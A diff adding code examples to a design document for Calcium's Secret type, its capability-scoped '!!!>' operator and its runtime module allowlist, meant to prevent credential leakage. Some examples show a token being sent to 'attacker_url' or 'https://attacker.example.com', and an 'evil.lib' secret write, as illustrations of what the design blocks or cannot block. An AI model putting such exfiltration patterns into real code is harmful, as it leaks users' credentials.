@@ -25,6 +25,24 @@ The design has two independent gates:
 
 Both gates must pass. Source code cannot grant itself runtime authority.
 
+End-to-end shape:
+
+```calcium
+// main.ca (entry module)
+api_cap = Secret.capability(http.send_secret, {
+    url: "https://api.example.com/upload"
+});
+
+Secret.with(api_cap) {
+    token !!!> http.send_secret(url);
+}
+```
+
+```bash
+# Runtime authority is separate from source code.
+calcium run --allow-secret-write=entry main.ca
+```
+
 ## Goals
 
 - Prevent accidental leakage of secrets through logs, string conversion,
@@ -38,6 +56,19 @@ Both gates must pass. Source code cannot grant itself runtime authority.
 - Preserve Calcium's existing effect pipeline model (`|>`, `!>`, `!?`).
 - Fail closed by default.
 
+Intended developer experience:
+
+```calcium
+token = Secret.wrap(env_token);
+
+token !> io.println;       // rejected: use !!!> and a capability
+to_string(token);          // "<secret>"
+
+Secret.with(api_cap) {
+    token !!!> http.send_secret(url);  // explicit, auditable boundary
+}
+```
+
 ## Non-goals
 
 - Protecting against all malicious code or side channels (timing, memory
@@ -48,6 +79,19 @@ Both gates must pass. Source code cannot grant itself runtime authority.
 - Preventing a trusted sink from sending a secret to an attacker-controlled
   destination. Capabilities limit the destination/operation; they do not
   validate the application's business logic.
+
+For example, this remains an application-level mistake if the application
+creates such a capability:
+
+```calcium
+bad_cap = Secret.capability(http.send_secret, {url: attacker_url});
+Secret.with(bad_cap) {
+    token !!!> http.send_secret(attacker_url);
+}
+```
+
+The runtime can enforce that the sink and destination match the capability, but
+it cannot know that the destination is malicious.
 
 ## `Secret` value
 
@@ -70,6 +114,16 @@ pattern and no field access. Pattern matching on `Secret` is a compile error.
 ```calcium
 Secret.wrap(value)        // value -> Secret
 Secret.map(secret, fn)    // apply a pure function, result stays Secret
+```
+
+```calcium
+token = Secret.wrap("  token-123  ");
+normalized = Secret.map(token, s => string.trim(s));
+
+credentials = Secret.wrap({
+    user: "alice",
+    password: "hunter2"
+});
 ```
 
 `Secret.map` is the supported way to transform a secret value. The callback is
@@ -104,6 +158,29 @@ The following operations are rejected:
 - Direct equality (`secret == other`); use `Secret.equal(a, b)` when needed.
 - Casting/conversion through `types.to_string` or any other generic conversion.
 
+```calcium
+token = Secret.wrap("token-123");
+
+to_string(token);              // "<secret>"
+io.println(token);             // <secret>
+"token is ${token}";           // "token is <secret>"
+
+[token, "public"] |> to_string;
+// [<secret>, public] (recursive redaction)
+
+{authorization: token} |> to_string;
+// {authorization: <secret>} (recursive redaction)
+
+json.stringify(token);         // failure("cannot serialize Secret")
+toml.stringify(token);         // failure("cannot serialize Secret")
+dbi.quote(token);              // failure("cannot quote Secret")
+
+token[0];                      // compile error
+len(token);                    // compile error
+string.upper(token);           // compile error
+token == Secret.wrap("x");     // compile error; use Secret.equal
+```
+
 ## Secret-authorized effect pipeline: `!!!>`
 
 `!!!>` is a distinct operator from `!>`.
@@ -123,6 +200,15 @@ Secret.with(api_cap) {
       |> Secret.map(trim)
       !!!> http.send_secret(url);
 }
+```
+
+Rejected forms:
+
+```calcium
+api_key !> io.println;        // compile error: normal effect pipeline
+
+api_key !!!> http.send_secret(url);
+// compile error: !!!> requires an active Secret.with scope
 ```
 
 Rules:
@@ -176,6 +262,17 @@ upload(token, api_cap);
 
 The library can carry the Secret to an authorized sink but cannot inspect it.
 
+```calcium
+// Library receives only an opaque Secret and an opaque capability.
+func! upload(value: Secret, cap) = Secret.with(cap) {
+    value !!!> http.send_secret(url)
+};
+
+// Library cannot print or serialize the raw value.
+func! debug(value: Secret) = io.println(value);
+// prints "<secret>", never the underlying value
+```
+
 ### Capability creation
 
 - Only the entry module may create capabilities.
@@ -188,6 +285,24 @@ The library can carry the Secret to an authorized sink but cannot inspect it.
 - Capabilities are not forgeable by constructing plain hashes/strings with the
   same shape.
 
+Entry module:
+
+```calcium
+// entry module: allowed
+api_cap = Secret.capability(http.send_secret, {
+    url: "https://api.example.com/upload"
+});
+```
+
+Imported module:
+
+```calcium
+// imported module: compile error
+lib_cap = Secret.capability(http.send_secret, {
+    url: "https://attacker.example.com"
+});
+```
+
 ### Capability scope
 
 `Secret.with(cap) { ... }` evaluates the block with `cap` active.
@@ -197,6 +312,25 @@ The library can carry the Secret to an authorized sink but cannot inspect it.
 - The compiler may additionally check statically that the named sink is
   covered by the capability.
 - The runtime verifies the capability at the effect boundary.
+
+```calcium
+result = Secret.with(api_cap) {
+    token !!!> http.send_secret(url)
+};
+
+// Outside the scope, !!!> is invalid.
+token !!!> http.send_secret(url);  // compile error
+```
+
+The block is an expression, so it can be composed:
+
+```calcium
+status = Secret.with(api_cap) {
+    token
+      |> Secret.map(trim)
+      !!!> http.send_secret(url)
+};
+```
 
 ## Runtime module allowlist
 
@@ -227,6 +361,21 @@ At a Secret-to-effect boundary, all of the following must hold:
 
 If any check fails, the VM raises a runtime error.
 
+```calcium
+// app.auth, allowlisted
+Secret.with(api_cap) {
+    token !!!> http.send_secret(url);  // OK
+}
+```
+
+```calcium
+// evil.lib, not allowlisted
+Secret.with(api_cap) {
+    token !!!> http.send_secret(url);
+    // runtime error: evil.lib is not allowed to write secrets
+}
+```
+
 ### Module identity
 
 The allowlist must use canonical module identities, not user-controlled
@@ -237,11 +386,23 @@ namespace strings.
 - Standard library: fixed IDs such as `core.http`.
 - Entry module: the special token `entry` or its canonical path.
 
+Canonical IDs used by the policy:
+
+```text
+entry
+./lib/auth.ca
+ytnobody/http@1.2.0
+core.http
+```
+
 A module must not be able to obtain authority merely by declaring:
 
 ```calcium
 namespace ytnobody.http;
 ```
+
+The namespace above does not match `ytnobody/http@1.2.0` in the allowlist; the
+policy checks the resolved module identity, not the declared namespace.
 
 ### Default policy
 
@@ -251,6 +412,17 @@ explicit `--allow-secret-write=entry` switch.
 
 Allowlist entries are module-granular in the first version. Future versions may
 extend the policy to `(module, sink, destination)` tuples.
+
+```bash
+# Default: Secret writes are denied, including in the entry module.
+calcium run main.ca
+
+# Explicitly allow the entry module only.
+calcium run --allow-secret-write=entry main.ca
+
+# Allow a specific imported module as well.
+calcium run   --allow-secret-write=entry   --allow-secret-write=app.auth   main.ca
+```
 
 ## Trusted sinks
 
@@ -268,6 +440,22 @@ os.proc_write_secret(handle, secret, cap)
 Pure Calcium libraries cannot declare themselves as trusted sinks. They can
 accept a Secret and a capability and pass them to a trusted sink.
 
+```calcium
+// stdlib/runtime trusted sink (conceptual)
+func! send_secret(url, secret: Secret, cap: SecretCapability) = ...;
+
+// Application-level library: forwards, never unwraps
+func! upload(secret: Secret, cap: SecretCapability) =
+    Secret.with(cap) {
+        secret !!!> http.send_secret(url)
+    };
+```
+
+```calcium
+// Invalid: pure Calcium code cannot become a trusted sink.
+func! fake_sink(secret: Secret) = secret;  // cannot unwrap or bypass policy
+```
+
 ## Container semantics
 
 Secrets may be nested in arrays, hashes, tuples, and ADTs. Any operation that
@@ -276,6 +464,29 @@ serializes or renders a container must recursively redact Secret leaves.
 Passing a container that contains a Secret to a normal effect is subject to the
 same checks as passing the Secret directly. The runtime must scan arguments
 recursively (or use a taint marker propagated by containers).
+
+```calcium
+payload = {
+    authorization: Secret.wrap(token),
+    count: 1
+};
+
+to_string(payload);
+// "{authorization: <secret>, count: 1}"
+
+http.post(url, payload);  // compile/runtime error: contains a Secret
+
+Secret.with(api_cap) {
+    payload !!!> http.send_secret(url);  // allowed if cap/policy match
+}
+```
+
+```calcium
+nested = [Secret.wrap(token), {password: Secret.wrap(pw)}];
+
+to_string(nested);        // "[<secret>, {password: <secret>}]"
+json.stringify(nested);   // failure: contains a Secret
+```
 
 ## Error handling
 
@@ -297,11 +508,43 @@ Runtime errors:
 Error messages must never contain the Secret's underlying value. They may
 identify the module, effect, and capability.
 
+```calcium
+// Compile-time
+token !> io.println;
+// error: Secret cannot be passed to '!>'; use Secret.with(cap) { ... !!!> ... }
+
+token !!!> http.send_secret(url);
+// error: '!!!>' requires an active Secret.with(cap) scope
+
+match token
+    Secret(v) => v
+// error: Secret is opaque and cannot be pattern-matched
+```
+
+```calcium
+// Runtime
+Secret.with(api_cap) {
+    token !!!> http.send_secret(url);
+}
+// error: module 'evil.lib' is not allowed to write secrets
+```
+
 ## Gradual typing backstop
 
 Calcium allows untyped code and `Any`. Compile-time checks are therefore best
 effort. The VM must enforce Secret safety at effect boundaries regardless of
 static types.
+
+```calcium
+func! dynamic_leak(x) = io.println(x);
+
+hidden = make_hidden_value(token);  // statically Any
+dynamic_leak(hidden);
+// runtime error: Secret reached an unapproved effect boundary
+```
+
+Even if the compiler cannot prove that `hidden` is a Secret, the runtime value
+still carries the Secret wrapper and the effect boundary rejects it.
 
 ## Compatibility
 
@@ -311,6 +554,16 @@ static types.
 - Existing values are unaffected; wrapping is explicit.
 - Existing effect pipelines continue to work for non-Secret values.
 - JSON/DB modules are updated to reject or redact Secret values by default.
+
+```calcium
+// Existing non-secret code keeps working unchanged.
+value !> io.println;
+
+// Secret code uses the new operator and an explicit capability scope.
+Secret.with(api_cap) {
+    secret_value !!!> http.send_secret(url);
+}
+```
 
 ## Test plan
 
@@ -326,6 +579,28 @@ Compile-time:
 Runtime:
 
 - Redaction in `to_string`, print, interpolation, arrays, hashes, errors.
+
+Representative cases:
+
+```calcium
+// Compile-time rejection
+token !> io.println;
+
+// Runtime rejection
+Secret.with(api_cap) {
+    token !!!> http.send_secret(url);
+}  // when the module is not in the runtime allowlist
+
+// Authorized path
+Secret.with(api_cap) {
+    token !!!> http.send_secret(url);
+}  // when the module is allowlisted and the capability matches
+
+// Redaction
+to_string(token);        // "<secret>"
+json.stringify(token);   // failure
+```
+
 - Authorized `Secret.with(cap) { secret !!!> sink; }` succeeds when module is
   allowed.
 - Same code fails when module is not in the runtime allowlist.
@@ -347,3 +622,23 @@ Runtime:
 Security-sensitive behavior should be reviewed before phase 5 ships; phases 1–2
 are useful as an accidental-leak prevention layer, but not as full runtime
 authorization.
+
+Phase 1–2 target:
+
+```calcium
+token = Secret.wrap("token-123");
+to_string(token);  // "<secret>"
+
+token !> io.println;  // rejected
+```
+
+Phase 3–5 target:
+
+```calcium
+Secret.with(api_cap) {
+    token !!!> http.send_secret(url);
+}
+```
+
+with the runtime module allowlist deciding whether the currently executing
+module may perform the write.
